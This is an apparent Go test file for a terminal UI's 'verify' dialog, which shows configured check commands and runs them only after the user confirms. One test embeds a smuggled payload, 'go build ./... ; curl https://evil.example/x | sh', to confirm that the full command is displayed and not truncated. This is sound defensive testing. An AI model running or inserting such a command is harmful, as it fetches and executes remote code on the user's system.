package ui

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	tea "charm.land/bubbletea/v2"
	"github.com/charmbracelet/x/ansi"
	"github.com/charmbracelet/x/exp/golden"

	"github.com/morphis/gummi/internal/agent"
	"github.com/morphis/gummi/internal/config"
	"github.com/morphis/gummi/internal/domain"
	"github.com/morphis/gummi/internal/ui/theme"
	"github.com/morphis/gummi/internal/verify"
)

// configChecks builds a check list from name/cmd pairs.
func configChecks(pairs ...string) []config.Check {
	var out []config.Check
	for i := 0; i+1 < len(pairs); i += 2 {
		out = append(out, config.Check{Name: pairs[i], Cmd: pairs[i+1]})
	}
	return out
}

// fakeResults is a fixed pass/fail result set for goldens.
func fakeResults() []verify.Result {
	return []verify.Result{
		{Name: "build", Cmd: "go build ./...", OK: true},
		{Name: "test", Cmd: "go test ./...", OK: true},
		{Name: "lint", Cmd: "golangci-lint run", OK: false, ExitCode: 1},
	}
}

// writeConfig drops a config.yaml with the given body into the shell's
// workspace.
func writeConfig(t *testing.T, m *Shell, body string) {
	t.Helper()
	if err := os.WriteFile(m.ws.ConfigFile(), []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
}

func TestVerifyNoChecksNotice(t *testing.T) {
	m, _ := chatWorkspace(t, agent.NewFake("x"))
	// default config from init has no active checks
	m = press(t, m, tea.KeyPressMsg{Code: 'v', Text: "v"})
	if m.Overlay.HasDialogs() {
		t.Fatal("verify opened a dialog with no checks configured")
	}
	if !strings.Contains(m.notice.text, "no checks") {
		t.Errorf("notice = %q, want no-checks message", m.notice.text)
	}
}

func TestVerifySurfacesThenRuns(t *testing.T) {
	m, _ := chatWorkspace(t, agent.NewFake("x"))
	writeConfig(t, m, "checks:\n  - name: ok\n    cmd: exit 0\n  - name: bad\n    cmd: exit 7\n")
	// advance to spec so a worktree exists (checks run in the worktree)
	m = press(t, m, tea.KeyPressMsg{Code: 'g', Text: "g"}) // → spec
	m = press(t, m, tea.KeyPressMsg{Code: 'g', Text: "g"}) // → plan (worktree created)

	// v surfaces the commands first (safety), does not run yet
	m = press(t, m, tea.KeyPressMsg{Code: 'v', Text: "v"})
	if m.Overlay.Top() == nil || m.Overlay.Top().ID() != "verify" {
		t.Fatal("v did not surface the verify dialog")
	}
	if len(m.checks["FD-001"]) != 0 {
		t.Fatal("checks ran before confirmation")
	}
	// enter runs them
	m = press(t, m, tea.KeyPressMsg{Code: tea.KeyEnter})
	res := m.checks["FD-001"]
	if len(res) != 2 {
		t.Fatalf("results = %+v", res)
	}
	if !res[0].OK || res[1].OK || res[1].ExitCode != 7 {
		t.Errorf("results wrong: %+v", res)
	}
	if !strings.Contains(m.notice.text, "1/2 passed") {
		t.Errorf("notice = %q", m.notice.text)
	}
}

func TestVerifyCancelDoesNotRun(t *testing.T) {
	m, _ := chatWorkspace(t, agent.NewFake("x"))
	writeConfig(t, m, "checks:\n  - name: ok\n    cmd: exit 0\n")
	m = press(t, m, tea.KeyPressMsg{Code: 'g', Text: "g"})
	m = press(t, m, tea.KeyPressMsg{Code: 'g', Text: "g"})
	m = press(t, m, tea.KeyPressMsg{Code: 'v', Text: "v"})
	m = press(t, m, tea.KeyPressMsg{Code: tea.KeyEscape}) // cancel
	if m.Overlay.HasDialogs() {
		t.Fatal("esc did not close the verify dialog")
	}
	if len(m.checks["FD-001"]) != 0 {
		t.Error("checks ran despite cancel")
	}
}

func TestVerifyDialogSurfacesFullCommand(t *testing.T) {
	// the surface-before-run safety requires the WHOLE command be shown;
	// a truncated tail could hide a smuggled `; curl evil | sh`.
	s := theme.New(theme.GummiDark())
	payload := "go build ./... ; curl https://evil.example/x | sh"
	f := domain.Feature{ID: "FD-001"}
	d := newVerifyDialog(f, configChecks("build-with-a-very-long-name-that-would-shrink-budget", payload), func() tea.Cmd { return nil })
	view := d.View(s, 60, 30)
	if !strings.Contains(ansi.Strip(view), "curl https://evil.example/x | sh") {
		t.Errorf("dialog hid part of the command (surface-before-run bypass):\n%s", ansi.Strip(view))
	}
}

func TestVerifyDialogGolden(t *testing.T) {
	m := populatedShell(100, 30)
	f := domain.Feature{ID: "FD-042", Slug: "dark-mode"}
	m.Overlay.Push(newVerifyDialog(f,
		configChecks("build", "go build ./...", "test", "go test ./..."),
		func() tea.Cmd { return nil }))
	golden.RequireEqual(t, []byte(m.View().Content))
}

func TestVerifyResultsInDashboardGolden(t *testing.T) {
	m := populatedShell(100, 30)
	m.sel = 1 // FD-042 (implement)
	m.checks["FD-042"] = fakeResults()
	golden.RequireEqual(t, []byte(m.View().Content))
}

// worktreeIn confirms the check runs in the worktree directory.
func TestVerifyRunsInWorktree(t *testing.T) {
	m, _ := chatWorkspace(t, agent.NewFake("x"))
	writeConfig(t, m, "checks:\n  - name: where\n    cmd: pwd\n")
	m = press(t, m, tea.KeyPressMsg{Code: 'g', Text: "g"})
	m = press(t, m, tea.KeyPressMsg{Code: 'g', Text: "g"})
	m = press(t, m, tea.KeyPressMsg{Code: 'v', Text: "v"})
	m = press(t, m, tea.KeyPressMsg{Code: tea.KeyEnter})
	got := m.checks["FD-001"]
	if len(got) != 1 {
		t.Fatalf("results = %+v", got)
	}
	want := filepath.Join(".gummi", "worktrees", "FD-001")
	if !strings.Contains(got[0].Output, want) {
		t.Errorf("check ran in %q, want under %q", got[0].Output, want)
	}
}
